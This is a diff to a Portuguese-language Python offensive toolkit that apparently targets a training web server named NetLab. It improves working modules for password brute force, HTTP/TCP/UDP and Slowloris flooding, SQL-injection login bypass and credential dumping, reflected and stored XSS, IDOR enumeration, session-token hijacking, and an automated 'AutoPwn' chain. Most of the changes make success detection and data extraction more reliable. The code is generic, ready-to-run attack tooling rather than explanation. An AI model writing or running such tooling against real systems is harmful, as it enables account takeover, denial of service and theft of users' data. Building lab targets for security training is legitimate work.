@@ -46,7 +46,9 @@ import sys
 import time
 import threading
 from abc         import ABC, abstractmethod
-from typing      import Dict, Iterator, List, Optional, Tuple
+from dataclasses import dataclass, field
+from typing      import Dict, Iterator, List, Optional, Tuple, Any
+import hashlib
 
 # ── Dependências opcionais ────────────────────────────────────────────────────
 
@@ -196,12 +198,22 @@ _KW_FALHA = frozenset({
     "incorretos", "incorreto", "inválido", "inválidos",
     "usuario ou senha", "usuário ou senha",
     "senha errada", "invalid", "incorrect", "wrong",
-    "failed", "denied", "error", "erro",
+    "failed", "denied", "error", "erro", "unauthorized",
+    "forbidden", "bad request", "tente novamente", "fail",
+    "negado", "proibido", "not authorized", "não autorizado",
 })
 _KW_SUCESSO = frozenset({
     "sessão ativa", "sessao ativa", "encerrar sessão", "encerrar sessao",
     "sair", "logout", "dashboard", "bem-vindo", "welcome",
-    "iniciada como", "logado", "sessão iniciada",
+    "iniciada como", "logado", "sessão iniciada", "sucesso", "success",
+    "autenticado", "authenticated", "meu perfil", "my profile",
+    "logado como", "perfil", "minha conta", "painel", "session active",
+})
+
+_LABELS_TABELA_IDOR = frozenset({
+    "ação", "id", "quantidade", "preço", "total", "pedido",
+    "produto", "usuario", "usuário", "preco", "action",
+    "unitário", "unitario",
 })
 
 _USER_AGENTS = (
@@ -276,11 +288,11 @@ def gerar_intervalo(ini: int, fim: int) -> List[str]:
 
 
 def gerar_por_comprimento(tamanhos: List[int]) -> List[str]:
+    """Gera todas as combinações numéricas para os comprimentos dados.
+    Usa zfill para manter zeros à esquerda (ex: 4 dígitos → 0000-9999)."""
     resultado = []
     for t in tamanhos:
-        ini = 10 ** (t - 1) if t > 1 else 0
-        fim = 10 ** t - 1
-        resultado.extend(str(i) for i in range(ini, fim + 1))
+        resultado.extend(str(i).zfill(t) for i in range(0, 10**t))
     return resultado
 
 
@@ -341,33 +353,78 @@ def _headers_extras() -> dict:
     }
 
 
-def _login_bem_sucedido(status: int, corpo: str, location: str) -> bool:
+def _login_bem_sucedido(
+    status: int,
+    corpo: str,
+    location: str,
+    set_cookie: str = "",
+) -> bool:
     """
-    Detecta login bem-sucedido no servidor NetLab.
+    Detecta login bem-sucedido com sistema de pontuação em camadas.
 
-    O servidor NetLab retorna HTTP 200 com o HTML da página inicial
-    quando o login é aceito. A página inicial autenticada contém o
-    texto 'Sessão ativa' ou 'encerrar sessão' no HTML.
-    Em falha, retorna HTTP 200 mas com 'incorretos' no corpo.
+    Evidências são ponderadas para evitar falsos positivos causados por
+    palavras-chave genéricas presentes em páginas de erro.
+
+    Retorna True apenas quando há evidência forte suficiente.
     """
-    # Redirect explícito para fora do /login é sucesso inequívoco
+    # ── Camada 0: redirect explícito para fora do /login ─────────────────────
     if status in (301, 302, 303, 307, 308):
         if location and "/login" not in location.lower():
             return True
 
-    if status == 200:
-        corpo_lower = corpo.lower()
-        # Qualquer indicador positivo de sessão autenticada
-        if any(k in corpo_lower for k in _KW_SUCESSO):
-            return True
-        # Nenhum indicador de falha E nenhuma palavra de login presente
-        # (evita falso positivo na própria página de login vazia)
-        sem_falha = not any(k in corpo_lower for k in _KW_FALHA)
-        sem_login_form = "type=\"password\"" not in corpo_lower
-        if sem_falha and sem_login_form:
-            return True
+    if status != 200:
+        return False
 
-    return False
+    corpo_lower = corpo.lower()
+
+    # ── Camada 1: evidência forense direta — Set-Cookie com padrão do NetLab ──
+    # O servidor emite "sessao=tokenN" SOMENTE em login bem-sucedido.
+    # Esta é a verificação mais confiável disponível.
+    if set_cookie:
+        cookie_lower = set_cookie.lower()
+        if "sessao=token" in cookie_lower or "session=" in cookie_lower:
+            # Confirma que não é uma resposta de erro disfarçada
+            if not any(k in corpo_lower for k in _KW_FALHA):
+                return True
+
+    # ── Camada 2: presença de campo de senha indica que ainda estamos no form ─
+    # Checamos ANTES das palavras de sucesso para filtrar falsos positivos.
+    _CAMPO_SENHA_PATTERNS = (
+        'type="password"', "type='password'", "type=password",
+        'name="senha"',    "name='senha'",
+        'name="password"', "name='password'",
+        'name="pwd"',      "name='pwd'",
+        # Atributo em ordem invertida (defensivo contra variações de template)
+        'password" type=', 'password\' type=',
+    )
+    if any(p in corpo_lower for p in _CAMPO_SENHA_PATTERNS):
+        return False
+
+    # ── Camada 3: presença explícita de indicadores de falha ─────────────────
+    if any(k in corpo_lower for k in _KW_FALHA):
+        return False
+
+    # ── Camada 4: sistema de pontuação com palavras-chave de sucesso ──────────
+    # Palavras FORTES (contexto específico de sessão autenticada)
+    _KW_SUCESSO_FORTE = frozenset({
+        "sessão ativa", "sessao ativa", "sess&atilde;o ativa",
+        "encerrar sessão", "encerrar sessao",
+        "iniciada como",
+        "logado como",
+    })
+    # Palavras FRACAS (podem aparecer em outros contextos)
+    _KW_SUCESSO_FRACO = frozenset({
+        "logout", "dashboard", "meu perfil", "my profile",
+        "session active", "autenticado", "authenticated",
+        "bem-vindo", "welcome",
+    })
+
+    pontuacao = 0
+    pontuacao += sum(2 for k in _KW_SUCESSO_FORTE if k in corpo_lower)
+    pontuacao += sum(1 for k in _KW_SUCESSO_FRACO if k in corpo_lower)
+
+    # Exige ao menos uma palavra forte (2 pontos) OU duas fracas distintas
+    return pontuacao >= 2
 
 
 def _detecta_bloqueio(status: int, corpo: str) -> bool:
@@ -388,6 +445,65 @@ def testar_conectividade(url: str) -> bool:
     except Exception as e:
         aviso(f"Servidor inacessível ({e}). Verifique se está no ar.")
         return False
+
+
+@dataclass
+class EvidenciaAtaque:
+    """
+    Representa uma evidência coletada durante um ataque.
+    Separa o que foi observado (evidencia_bruta) de como foi interpretado (conclusao).
+    """
+    tipo:           str               # "bypass_sqli", "xss_refletido", "idor", etc.
+    endpoint:       str
+    payload:        str               = ""
+    status_http:    int               = 0
+    set_cookie:     str               = ""
+    usuario:        str               = ""
+    conclusao:      str               = ""
+    evidencia_bruta: str              = ""  # trecho do HTML que confirmou o achado
+    confianca:      str               = "ALTA"  # ALTA | MEDIA | BAIXA
+    metadados:      Dict[str, Any]    = field(default_factory=dict)
+
+    def __str__(self) -> str:
+        return (
+            f"[{self.confianca}] {self.tipo} @ {self.endpoint} "
+            f"| payload={self.payload[:40]!r} "
+            f"| usuário={self.usuario or '—'} "
+            f"| conclusão={self.conclusao}"
+        )
+
+
+def _extrair_trecho_evidencia(html: str, indicador: str, contexto: int = 80) -> str:
+    """Extrai o trecho do HTML ao redor do indicador encontrado, para rastreabilidade."""
+    idx = html.lower().find(indicador.lower())
+    if idx == -1:
+        return ""
+    inicio = max(0, idx - contexto // 2)
+    fim    = min(len(html), idx + len(indicador) + contexto // 2)
+    return html[inicio:fim].strip()
+
+
+def _extrair_usuario_do_corpo(corpo: str) -> str:
+    """
+    Extrai o nome do usuário autenticado do HTML do NetLab.
+    Usa padrões específicos antes de recorrer a fallbacks amplos.
+    """
+    # Padrão específico do NetLab: "Sessão ativa: <strong>NOME</strong>"
+    for pattern in (
+        r"[Ss]ess[aã]o ativa[^<]*<strong>([^<]{1,40})</strong>",
+        r"[Ss]ess&atilde;o ativa[^<]*<strong>([^<]{1,40})</strong>",
+        r"iniciada como[^<]*<strong>([^<]{1,40})</strong>",
+        r"logado como[^<]*<strong>([^<]{1,40})</strong>",
+        # Fallback: qualquer <strong> na nav-session
+        r'nav-session[^>]*>.*?<strong>([^<]{1,40})</strong>',
+    ):
+        m = re.search(pattern, corpo, re.IGNORECASE | re.DOTALL)
+        if m:
+            candidato = m.group(1).strip()
+            # Filtra falsos positivos: o nome deve parecer um username
+            if re.match(r'^[a-zA-Z0-9_.\-]{1,30}$', candidato):
+                return candidato
+    return ""
 
 
 # ══════════════════════════════════════════════════════════════════════════════
@@ -461,6 +577,7 @@ class ModuloBruteForce(BaseAtaque):
         self._timeout:      float         = 3.0
         self._proxy:        Optional[str] = None
         self._resultado:    Optional[str] = None
+        self._bypass_sqli:  Optional[str] = None
         self._waf:          bool          = False
 
     # ── Configuração ──────────────────────────────────────────────────────────
@@ -540,8 +657,8 @@ class ModuloBruteForce(BaseAtaque):
                 tamanhos = [int(x.strip()) for x in raw.split(",")]
             else:
                 tamanhos = [int(raw.strip())]
-            total = sum(10**t - (10**(t-1) if t > 1 else 0) for t in tamanhos)
-            aviso(f"≈ {total:,} senhas a testar.")
+            total = sum(10**t for t in tamanhos)
+            aviso(f"{total:,} senhas a testar (com zeros à esquerda).")
             if not entrada(f"Confirmar {total:,} senhas? (s/N)", "n").lower().startswith("s"):
                 return self._menu_wordlist()
             return gerar_por_comprimento(tamanhos)
@@ -569,7 +686,7 @@ class ModuloBruteForce(BaseAtaque):
             aviso(f"Força bruta total: {total:,} senhas.")
             if not entrada(f"Confirmar {total:,} senhas? (s/N)", "n").lower().startswith("s"):
                 return self._menu_wordlist()
-            return gerar_intervalo(0, total - 1)
+            return gerar_por_comprimento([digitos])
 
         aviso("Opção inválida — usando senhas comuns.")
         return list(_SENHAS_COMUNS)
@@ -654,7 +771,11 @@ class ModuloBruteForce(BaseAtaque):
                 for t in done:
                     exc = t.exception() if not t.cancelled() else None
                     if isinstance(exc, _SenhaAchada):
-                        self._resultado = exc.senha
+                        # Não sobrescreve self._resultado aqui — o _worker
+                        # já definiu corretamente _resultado ou _bypass_sqli.
+                        # Apenas marca como achada se o worker não classificou como bypass.
+                        if self._bypass_sqli is None:
+                            self._resultado = exc.senha
                         break
             except Exception:
                 pass
@@ -676,7 +797,7 @@ class ModuloBruteForce(BaseAtaque):
             if senha is None or encontrado.is_set():
                 return
 
-            status, corpo, loc = await self._post_login(sessao, senha)
+            status, corpo, loc, set_cookie = await self._post_login(sessao, senha)
             self._tentativas += 1
 
             if prog and tid is not None:
@@ -696,10 +817,37 @@ class ModuloBruteForce(BaseAtaque):
 
             if status == 0:
                 self._erros += 1
-            elif _login_bem_sucedido(status, corpo, loc):
-                encontrado.set()
-                destaque(f"\n\n  ✓ SENHA ENCONTRADA: {_BOLD}{senha}{_RESET}\n")
-                raise _SenhaAchada(senha)
+            elif _login_bem_sucedido(status, corpo, loc, set_cookie):
+                if not encontrado.is_set():
+                    encontrado.set()
+                    
+                    # Extrai o usuário REAL autenticado, não o solicitado
+                    usuario_real = _extrair_usuario_do_corpo(corpo)
+                    eh_sqli = any(c in senha for c in ("'", "--", "OR", "UNION"))
+
+                    if eh_sqli:
+                        # Bypass SQLi: reporta como vulnerabilidade, não como senha encontrada
+                        destaque(
+                            f"\n\n  ⚠  BYPASS SQLi DETECTADO — autenticou como "
+                            f"'{usuario_real or 'desconhecido'}' "
+                            f"(alvo era '{self._usuario}')\n"
+                            f"  Payload: {senha}\n"
+                            f"  Isso é uma vulnerabilidade SQLi, não a senha de {self._usuario}.\n"
+                        )
+                        self._resultado = None          # Não marca como senha encontrada
+                        self._bypass_sqli = senha       # Campo separado para o bypass
+                    else:
+                        # Senha legítima encontrada
+                        if usuario_real and usuario_real.lower() != self._usuario.lower():
+                            aviso(
+                                f"Senha '{senha}' autenticou como '{usuario_real}' "
+                                f"(esperado: '{self._usuario}') — verifique manualmente."
+                            )
+                        destaque(f"\n\n  ✓ SENHA ENCONTRADA: {_BOLD}{senha}{_RESET}  "
+                                 f"(usuário confirmado: {usuario_real or self._usuario})\n")
+                        self._resultado = senha
+
+                    raise _SenhaAchada(senha)
 
             if self._delay > 0:
                 await asyncio.sleep(self._delay)
@@ -709,8 +857,8 @@ class ModuloBruteForce(BaseAtaque):
                 tps = self._tentativas / self._decorrido
                 info(f"[{self._tentativas:,}/{len(self._senhas):,}] {tps:.0f} req/s")
 
-    async def _post_login(self, sessao, senha: str) -> Tuple[int, str, str]:
-        """Envia POST /login e retorna (status, corpo, location)."""
+    async def _post_login(self, sessao, senha: str) -> Tuple[int, str, str, str]:
+        """Envia POST /login e retorna (status, corpo, location, set_cookie)."""
         try:
             async with sessao.post(
                 self._url_login,
@@ -719,11 +867,12 @@ class ModuloBruteForce(BaseAtaque):
                 allow_redirects=False,
                 headers=_headers_extras(),
             ) as resp:
-                corpo = await resp.text(errors="ignore")
-                loc   = resp.headers.get("Location", "")
-                return resp.status, corpo, loc
+                corpo      = await resp.text(errors="ignore")
+                loc        = resp.headers.get("Location", "")
+                set_cookie = resp.headers.get("Set-Cookie", "")
+                return resp.status, corpo, loc, set_cookie
         except Exception:
-            return 0, "", ""
+            return 0, "", "", ""
 
     # ── Motor síncrono (requests) ─────────────────────────────────────────────
 
@@ -760,10 +909,23 @@ class ModuloBruteForce(BaseAtaque):
                     )
                     self._tentativas += 1
                     if _login_bem_sucedido(r.status_code, r.text,
-                                           r.headers.get("Location", "")):
-                        self._resultado = senha
-                        parar.set()
-                        destaque(f"\n\n  ✓ SENHA ENCONTRADA: {_BOLD}{senha}{_RESET}\n")
+                                           r.headers.get("Location", ""),
+                                           r.headers.get("Set-Cookie", "")):
+                        if not parar.is_set():
+                            parar.set()
+                            usuario_real = _extrair_usuario_do_corpo(r.text)
+                            eh_sqli = any(c in senha for c in ("'", "--", "OR", "UNION"))
+
+                            if eh_sqli:
+                                destaque(
+                                    f"\n\n  ⚠  BYPASS SQLi DETECTADO — autenticou como '{usuario_real}'\n"
+                                    f"  Payload: {senha}\n"
+                                )
+                                self._bypass_sqli = senha
+                            else:
+                                destaque(f"\n\n  ✓ SENHA ENCONTRADA: {_BOLD}{senha}{_RESET}  "
+                                         f"(usuário confirmado: {usuario_real or self._usuario})\n")
+                                self._resultado = senha
                         return
                 except Exception:
                     self._erros += 1
@@ -789,7 +951,14 @@ class ModuloBruteForce(BaseAtaque):
 
         if self._resultado:
             print(f"\n  {_VERDE}{_BOLD}{'='*54}")
-            print(f"  [✓] SUCESSO!  Usuário: {self._usuario}  |  Senha: {self._resultado}")
+            print(f"  [✓] SENHA VÁLIDA  |  Usuário: {self._usuario}  |  Senha: {self._resultado}")
+            print(f"  {'='*54}{_RESET}")
+        elif self._bypass_sqli:
+            print(f"\n  {_AMAR}{_BOLD}{'='*54}")
+            print(f"  [!] VULNERABILIDADE SQLi — bypass de login confirmado")
+            print(f"  Payload: {self._bypass_sqli}")
+            print(f"  O servidor autenticou um usuário diferente do alvo.")
+            print(f"  Use o módulo 5 (SQL Injection) para exploração completa.")
             print(f"  {'='*54}{_RESET}")
         else:
             erro("Nenhuma senha válida encontrada no espaço testado.")
@@ -945,6 +1114,10 @@ class ModuloEstresse(BaseAtaque):
         w.write(req)
         await w.drain()
         w.close()
+        try:
+            await w.wait_closed()
+        except Exception:
+            pass
         self._tentativas += 1
 
     async def _tcp(self) -> None:
@@ -955,11 +1128,16 @@ class ModuloEstresse(BaseAtaque):
         w.write(b"GET / HTTP/1.0\r\n\r\n")
         await w.drain()
         w.close()
+        try:
+            await w.wait_closed()
+        except Exception:
+            pass
         self._tentativas += 1
 
     def _udp(self, sock: Optional[socket.socket]) -> None:
-        s = sock or socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.sendto(os.urandom(1024), (self._ip, self._porta))
+        if sock is None:
+            raise RuntimeError("Socket UDP não inicializado — bug interno.")
+        sock.sendto(os.urandom(1024), (self._ip, self._porta))
         self._tentativas += 1
 
     async def _slowloris(self) -> None:
@@ -981,6 +1159,10 @@ class ModuloEstresse(BaseAtaque):
             await w.drain()
             await asyncio.sleep(random.uniform(0.4, 1.2))
         w.close()
+        try:
+            await w.wait_closed()
+        except Exception:
+            pass
         self._tentativas += 1
 
     async def _stats_loop(self, tempo_fim: float) -> None:
@@ -1246,6 +1428,36 @@ class ModuloSQLInjection(BaseAtaque):
         if self._dump_users:
             self._fase_dump()
 
+    def _confirmar_bypass_sqli(
+        self,
+        status: int,
+        corpo: str,
+        location: str,
+        set_cookie: str,
+    ) -> Tuple[bool, str]:
+        """
+        Valida bypass SQLi com dois critérios independentes:
+          1. _login_bem_sucedido (baseado no HTML)
+          2. Presença de Set-Cookie com padrão de sessão do NetLab
+
+        Retorna (sucesso, nome_usuario).
+        Exige que AMBOS os critérios sejam satisfeitos para evitar falsos positivos.
+        """
+        html_ok    = _login_bem_sucedido(status, corpo, location, set_cookie)
+        cookie_ok  = "sessao=token" in set_cookie.lower() or "session=" in set_cookie.lower()
+        usuario    = _extrair_usuario_do_corpo(corpo) if html_ok else ""
+
+        if html_ok and cookie_ok:
+            return True, usuario or "admin"
+
+        if html_ok and not cookie_ok:
+            # HTML sugere sucesso mas sem cookie — pode ser falso positivo
+            aviso(f"HTML indica sucesso mas Set-Cookie ausente — descartando "
+                  f"(HTTP {status}, Set-Cookie: {set_cookie!r})")
+            return False, ""
+
+        return False, ""
+
     # ── Fase 1: Bypass de login ───────────────────────────────────────────────
 
     def _fase_bypass(self) -> None:
@@ -1261,19 +1473,36 @@ class ModuloSQLInjection(BaseAtaque):
                     allow_redirects=False,
                     headers=_headers_extras(),
                 )
-                if _login_bem_sucedido(r.status_code, r.text,
-                                        r.headers.get("Location", "")):
-                    ok(f"Bypass bem-sucedido!  payload: {payload!r}")
-                    self._resultados.append({"tipo": "bypass", "payload": payload,
-                                              "status": r.status_code})
-                    # Exibe cookie de sessão obtido
-                    cookie = r.headers.get("Set-Cookie", "")
-                    if cookie:
-                        info(f"Cookie de sessão: {cookie[:80]}")
+                status_code = r.status_code
+                corpo       = r.text
+                location    = r.headers.get("Location", "")
+                set_cookie  = r.headers.get("Set-Cookie", "")
+
+                sucesso, usuario = self._confirmar_bypass_sqli(
+                    status_code, corpo, location, set_cookie
+                )
+
+                if sucesso:
+                    evidencia = EvidenciaAtaque(
+                        tipo            = "sqli_bypass",
+                        endpoint        = "/login",
+                        payload         = payload,
+                        status_http     = status_code,
+                        set_cookie      = set_cookie,
+                        usuario         = usuario,
+                        conclusao       = f"Login bypass confirmado por HTML + Set-Cookie",
+                        evidencia_bruta = _extrair_trecho_evidencia(corpo, "sessão ativa") or _extrair_trecho_evidencia(corpo, "dashboard"),
+                        confianca       = "ALTA" if "sessao=token" in set_cookie.lower() else "MEDIA",
+                    )
+                    self._resultados.append(evidencia)
+                    ok(str(evidencia))
+                    
+                    if set_cookie:
+                        info(f"Cookie de sessão: {set_cookie[:80]}")
                     self._tentativas += 1
                     return
                 else:
-                    info(f"Payload falhou (HTTP {r.status_code}): {payload!r}")
+                    print(f"  {_DIM}· Payload falhou/descartado (HTTP {status_code}): {payload!r}{_RESET}")
             except Exception as e:
                 erro(f"Erro no payload {payload!r}: {e}")
             self._tentativas += 1
@@ -1335,16 +1564,16 @@ class ModuloSQLInjection(BaseAtaque):
                     self._url_base + f"/produtos?id=1 ORDER BY {i}--",
                     timeout=4, headers=_headers_extras(),
                 )
-                # Se retornar erro de SQL, a coluna i não existe
-                if r.status_code != 200 or ("erro" in r.text.lower()
-                                              and "column" in r.text.lower()):
+                # O servidor NetLab retorna "Erro SQL" no título da página
+                # quando a coluna i não existe
+                if r.status_code != 200 or "Erro SQL" in r.text:
                     return i - 1
             except Exception:
                 return i - 1
         return 3  # fallback padrão
 
     def _injetar(self, payload_sql: str) -> Optional[str]:
-        """Executa injeção em /produtos?id= e extrai o valor da segunda <td>."""
+        """Executa injeção em /produtos?id= e extrai o valor injetado de forma precisa."""
         try:
             url = self._url_base + "/produtos?id=1" + payload_sql
             r   = _req.get(url, timeout=5, headers=_headers_extras())
@@ -1353,23 +1582,49 @@ class ModuloSQLInjection(BaseAtaque):
                 tds = re.findall(r"<td[^>]*>(.*?)</td>", r.text, re.DOTALL | re.IGNORECASE)
                 # Remove tags HTML do conteúdo
                 tds_limpos = [re.sub(r"<[^>]+>", "", td).strip() for td in tds]
-                # Descarta células triviais (1, 2, 3...)
-                for td in tds_limpos:
-                    if td and td not in ("1", "2", "3", "—", ""):
+                # Filtra células vazias
+                tds_limpos = [td for td in tds_limpos if td]
+
+                # O dado útil está na linha injetada (geralmente a segunda linha).
+                # Em um UNION com 3 colunas, os índices 3, 4, 5 representam a 2ª linha.
+                _TRIVIAIS = frozenset({"1", "2", "3", "—", "", "id", "name", "price", "Notebook Dell XPS 15"})
+                
+                # Nome do produto original (índice 1)
+                prod_original = tds_limpos[1] if len(tds_limpos) > 1 else ""
+
+                # Varre de trás para frente buscando credenciais (contendo : ou |)
+                for td in reversed(tds_limpos):
+                    if td in _TRIVIAIS or td == prod_original:
+                        continue
+                    if ":" in td or "|" in td:
+                        return td
+                
+                # Fallback: qualquer dado não trivial
+                for td in reversed(tds_limpos):
+                    if td not in _TRIVIAIS and td != prod_original:
                         return td
         except Exception as e:
             aviso(f"Erro na injeção: {e}")
         return None
 
     def mostrar_resultado(self) -> None:
-        if self._resultados:
-            tabela_rich([
-                [r["tipo"].upper(),
-                 r.get("payload", r.get("dados", ""))[:80]]
-                for r in self._resultados
-            ], ["Tipo", "Resultado"], "Resultado — SQL Injection")
-        else:
+        if not self._resultados:
             erro("Nenhuma exploração bem-sucedida.")
+            return
+
+        linhas = []
+        for r in self._resultados:
+            if isinstance(r, EvidenciaAtaque):
+                # Caso venha do bypass de login
+                linhas.append([r.tipo.upper(), r.payload[:80] or r.conclusao[:80]])
+            else:
+                # Caso venha do dump (dict legado)
+                linhas.append([
+                    r.get("tipo", "dump").upper(),
+                    r.get("payload", r.get("dados", ""))[:80]
+                ])
+
+        tabela_rich(linhas, ["Tipo", "Resultado"], "Resultado — SQL Injection")
 
 
 # ══════════════════════════════════════════════════════════════════════════════
@@ -1411,30 +1666,64 @@ class ModuloXSS(BaseAtaque):
         if self._armazenado:
             self._xss_armazenado(sess)
 
+    def _xss_confirmado_no_html(self, payload: str, html_resposta: str) -> bool:
+        """
+        Verifica se o payload XSS foi refletido sem escape no HTML.
+
+        Estratégia em camadas:
+          1. Busca o payload literal (mais preciso)
+          2. Busca partes estruturais do payload que não deveriam sobreviver ao escape
+             (ex: '<script' — se escapado, viraria '&lt;script')
+          3. Nunca usa substring genérica como 'alert' sozinho
+        """
+        html_lower = html_resposta.lower()
+
+        # Extrai a estrutura do payload (tag ou atributo de evento)
+        tag_match  = re.search(r'<(\w+)', payload)
+        evt_match  = re.search(r'\bon\w+\s*=', payload, re.IGNORECASE)
+        href_match = re.search(r'javascript:', payload, re.IGNORECASE)
+
+        tag_alvo  = tag_match.group(0).lower()  if tag_match  else ""
+        evt_alvo  = evt_match.group(0).lower()  if evt_match  else ""
+        href_alvo = "javascript:"              if href_match else ""
+
+        indicadores = [i for i in (tag_alvo, evt_alvo, href_alvo) if i]
+
+        if not indicadores:
+            return False  # Payload sem estrutura reconhecível — não confirma
+
+        # Todos os indicadores estruturais devem aparecer não-escapados no HTML
+        # Se o servidor escapou corretamente, '<script' vira '&lt;script' — não encontrado
+        return all(ind in html_lower for ind in indicadores)
+
     def _xss_refletido(self, sess: "_req.Session") -> None:
         print(f"\n  {_AMAR}[*] Testando XSS refletido...{_RESET}")
 
         # (endpoint, parâmetro_GET)
         vetores = [
-            ("/busca?q=",      "q"),
-            ("/perfil?nome=",  "nome"),
+            ("/busca",  "q"),
+            ("/perfil", "nome"),
         ]
 
-        for ep_base, _ in vetores:
+        for endpoint, param_name in vetores:
             for payload in _XSS_PAYLOADS:
-                url = self._url_base + ep_base + payload
                 try:
-                    r = sess.get(url, timeout=4, headers=_headers_extras())
-                    # Verifica se o payload aparece não escapado no HTML
-                    # (busca a tag/evento no HTML raw, sem <br> ou encoding)
-                    payload_tag = re.sub(r"alert\(['\"]XSS['\"]\)", "alert", payload)
-                    if payload_tag.lower() in r.text.lower():
-                        ok(f"XSS refletido CONFIRMADO em {ep_base}")
+                    r = sess.get(
+                        self._url_base + endpoint,
+                        params={param_name: payload},
+                        timeout=4, headers=_headers_extras(),
+                    )
+                    if self._xss_confirmado_no_html(payload, r.text):
+                        ok(f"XSS refletido CONFIRMADO em {endpoint}?{param_name}=")
                         info(f"  Payload: {payload}")
-                        self._achados.append({"tipo": "refletido", "endpoint": ep_base,
-                                              "payload": payload})
+                        self._achados.append({
+                            "tipo":     "refletido",
+                            "endpoint": f"{endpoint}?{param_name}=",
+                            "payload":  payload,
+                            "evidencia": f"Tag/evento encontrado sem escape no HTML",
+                        })
                     else:
-                        print(f"  {_DIM}· Payload escapado em {ep_base}: {payload[:40]}{_RESET}")
+                        print(f"  {_DIM}· Payload escapado/não-refletido em {endpoint}?{param_name}=: {payload[:40]}{_RESET}")
                     self._tentativas += 1
                     time.sleep(0.2)
                 except Exception as e:
@@ -1455,7 +1744,8 @@ class ModuloXSS(BaseAtaque):
             return
 
         if not _login_bem_sucedido(r_login.status_code, r_login.text,
-                                    r_login.headers.get("Location", "")):
+                                    r_login.headers.get("Location", ""),
+                                    r_login.headers.get("Set-Cookie", "")):
             erro(f"Login falhou (HTTP {r_login.status_code}) — XSS armazenado cancelado.")
             info("  Dica: verifique usuário/senha. Padrão: alice / alice123")
             return
@@ -1474,14 +1764,16 @@ class ModuloXSS(BaseAtaque):
                     # Verifica se persiste na página
                     r_check = sess.get(self._url_base + "/comentarios",
                                        timeout=4, headers=_headers_extras())
-                    tag = re.sub(r"alert\(['\"]XSS['\"]\)", "alert", payload)
-                    if tag.lower() in r_check.text.lower():
+                    if self._xss_confirmado_no_html(payload, r_check.text):
                         ok(f"XSS ARMAZENADO CONFIRMADO na página /comentarios!")
-                        self._achados.append({"tipo": "armazenado",
-                                              "endpoint": "/comentarios",
-                                              "payload": payload})
+                        self._achados.append({
+                            "tipo":     "armazenado",
+                            "endpoint": "/comentarios",
+                            "payload":  payload,
+                            "evidencia": "Payload encontrado sem escape na lista de comentários",
+                        })
                     else:
-                        info("  Payload enviado — verifique /comentarios no navegador.")
+                        info("  Payload enviado — não confirmado automaticamente no HTML retornado.")
                     self._tentativas += 1
                     time.sleep(0.3)
             except Exception as e:
@@ -1602,9 +1894,7 @@ class ModuloIDOR(BaseAtaque):
         # Fallback: tenta encontrar qualquer valor que pareça usuário
         if "usuario" not in dados:
             for td in tds:
-                if re.match(r"^[a-z]{2,20}$", td, re.IGNORECASE) and td.lower() not in (
-                    "ação", "id", "quantidade", "preço", "total", "pedido"
-                ):
+                if re.match(r"^[a-zA-Z0-9_.]{2,30}$", td) and td.lower() not in _LABELS_TABELA_IDOR:
                     dados["usuario"] = td
                     break
 
@@ -1654,6 +1944,40 @@ class ModuloSessionHijack(BaseAtaque):
         info("Dica: faça alguns logins no servidor antes de executar este módulo "
              "para que haja tokens válidos para roubar.")
 
+    def _token_de_sessao_valido(
+        self,
+        status: int,
+        corpo: str,
+        token: str,
+    ) -> Tuple[bool, str]:
+        """
+        Valida token de sessão com critérios específicos do NetLab.
+
+        Retorna (valido, nome_usuario).
+        Evita falsos positivos causados por tags <strong> em páginas de erro.
+        """
+        if status != 200:
+            return False, ""
+
+        corpo_lower = corpo.lower()
+
+        # Critério primário: presença de indicadores de sessão ativa
+        _INDICADORES_SESSAO = (
+            "sessão ativa", "sessao ativa", "sess&atilde;o ativa",
+            "encerrar sessão", "encerrar sessao",
+            "iniciada como",
+        )
+        if not any(ind in corpo_lower for ind in _INDICADORES_SESSAO):
+            return False, ""
+
+        # Critério secundário: ausência de indicadores de falha
+        if any(k in corpo_lower for k in _KW_FALHA):
+            return False, ""
+
+        # Extração precisa do nome — usa _extrair_usuario_do_corpo
+        usuario = _extrair_usuario_do_corpo(corpo)
+        return True, usuario or "desconhecido"
+
     def executar(self) -> None:
         if not _REQUESTS_OK:
             erro("requests ausente.")
@@ -1674,23 +1998,9 @@ class ModuloSessionHijack(BaseAtaque):
                 )
                 self._tentativas += 1
 
-                # O servidor renderiza "Sessão ativa: <strong>USUARIO</strong>"
-                # quando o cookie é válido
-                if r.status_code == 200 and (
-                    "sessão ativa" in r.text.lower()
-                    or "encerrar sessão" in r.text.lower()
-                    or "sair" in r.text.lower()
-                ):
-                    # Extrai o nome do usuário da sessão ativa
-                    m = re.search(
-                        r"Sess[aã]o ativa.*?<strong>(.*?)</strong>",
-                        r.text, re.IGNORECASE | re.DOTALL,
-                    )
-                    if not m:
-                        # Fallback: qualquer <strong> na página
-                        m = re.search(r"<strong>([^<]{2,40})</strong>", r.text)
-
-                    usuario = m.group(1).strip() if m else "desconhecido"
+                # Validação robusta do token
+                valido, usuario = self._token_de_sessao_valido(r.status_code, r.text, token)
+                if valido:
                     ok(f"Token válido: {_BOLD}{token}{_RESET} → usuário: {_BOLD}{usuario}{_RESET}")
                     self._sessoes_roubadas.append((token, usuario))
                 else:
@@ -1853,7 +2163,8 @@ class ModuloAutoPwn(BaseAtaque):
                     timeout=5, allow_redirects=False, headers=_headers_extras(),
                 )
                 if _login_bem_sucedido(r.status_code, r.text,
-                                        r.headers.get("Location", "")):
+                                        r.headers.get("Location", ""),
+                                        r.headers.get("Set-Cookie", "")):
                     ok(f"SQLi bypass: {payload!r}")
                     self._cookie = r.headers.get("Set-Cookie", "")
                     # Tenta extrair nome do usuário logado
@@ -1912,7 +2223,8 @@ class ModuloAutoPwn(BaseAtaque):
                 timeout=5, allow_redirects=False, headers=_headers_extras(),
             )
             if _login_bem_sucedido(r.status_code, r.text,
-                                    r.headers.get("Location", "")):
+                                    r.headers.get("Location", ""),
+                                    r.headers.get("Set-Cookie", "")):
                 ok(f"Sessão estabelecida como {usuario}.")
                 self._cookie = r.headers.get("Set-Cookie", "")
                 self._log.append(f"Login legítimo: {usuario}")
@@ -1941,8 +2253,8 @@ class ModuloAutoPwn(BaseAtaque):
                                      re.DOTALL | re.IGNORECASE)
                     tds = [re.sub(r"<[^>]+>", "", td).strip() for td in tds]
                     dono = next((td for td in tds
-                                 if re.match(r"^[a-z]{2,20}$", td, re.IGNORECASE)
-                                 and td.lower() not in ("action", "id")), "?")
+                                 if re.match(r"^[a-zA-Z0-9_.]{2,30}$", td)
+                                 and td.lower() not in _LABELS_TABELA_IDOR), "desconhecido")
                     ok(f"Pedido #{pid} exposto — dono: {dono}")
                     encontrados += 1
                 time.sleep(0.15)
